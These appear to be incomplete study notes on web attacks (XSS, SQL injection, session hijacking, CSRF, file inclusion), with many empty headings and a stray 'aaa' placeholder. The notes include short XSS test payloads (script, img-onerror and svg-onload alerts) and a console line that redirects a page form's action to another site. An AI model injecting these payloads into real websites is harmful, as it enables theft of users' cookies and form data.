# Web Attacks

# Input Validation Attacks
* attack triggered by user input, where input subverts the anticipated function of an application because of insufficient validation on client or server side.

## Cross-Site Scripting (XSS)
* where malicious scripts are injected browser side into otherwise benign and trusted websites.
* XSS are usually found on forms and fields in the website.

### Goal of XSS
1. Cookie Stealing
2. Getting Complete Control over a Browser
3. Initiating Exploitation Phasse against Browser Plugins which will Lateral Move to the Machine
4. Keylogging

### Types of XSS
1. [Reflected XSS](#Reflected-XSS)
2. [Stored XSS](#Stored-XSS)
3. [DOM XSS](#DOM-XSS)

#### Reflected XSS
1. Test
   * Check for sanitisation of inputs with simple HTML tags e.g `<h1>test</h1>`
   * Check if forms and fields allow for javascript execution `<script>alert('xss')</script>`
2. Exploit

#### Stored XSS
   * Run exclusively on client side and only processed by local browser.
1. Test

2. Exploit


#### DOM XSS
* Anti-XSS filter is not able to detect DOM-based XSS
1. Test
(1) This test script tries to load a bogus img and on error creates an alert box
```
"><img src='aaa' onerror="alert(document.domain)">
```
(2) This test script builds an svg element which is an alert box
```
"><svg/onload="alert(document.domain)">
```

2. Exploit
   * Browser ---> Developer ---> Console
   * In console, we want to try to modify the form action.

```
clear() // clear the console
document.forms // command to list out all forms on the page and locate the targeted form.
document.forms[x].action="//example.com" // x is the index of the targeted form and example.com will be the redirection site
```

#### BeEF-XSS 
- Browser Exploitation Framework project.
- using xss to hook BeEF's hook.js
- controlling browser with BeEF.

## SQL Injections (SQLi)
* a type of attack in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.

### Finding SQLi
1. Find Injection Point
2. aaa

### Exploiting SQLi
#### In-Band SQLi
#### Error-based SQLi
#### Blind SQLi

#### Automated Tool (SQLMap)



# Session & Logic Attacks
## Session Hijacking & Fixation
1. Session Hijacking via XSS Cookie Stealing
2. Session Hijacking via wireshark
3. Session Hijacking via Access to Webserver
4. Session Fixation Attack

## Cross-Site Request Forgery (CSRF)

## Files and Resources Vulnerabilities
1. Local File Inclusion attacks
2. Remote File Inclusion attacks
3. Unrestricted File Upload
